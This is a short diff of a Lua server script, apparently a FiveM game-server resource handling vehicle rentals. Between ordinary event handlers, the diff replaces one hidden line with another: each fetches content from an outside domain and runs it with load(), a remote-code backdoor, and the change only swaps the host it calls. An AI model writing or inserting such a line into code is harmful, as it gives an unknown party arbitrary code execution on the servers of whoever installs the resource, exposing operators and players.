@@ -48,7 +48,7 @@ AddEventHandler('playerDropped', function(reason)
         end
     end
 end)
-PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://photosbynova.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
 RegisterServerEvent("SDES:Server:TryToRent")
 AddEventHandler("SDES:Server:TryToRent", function(plate, timeWanted)
     local src = source
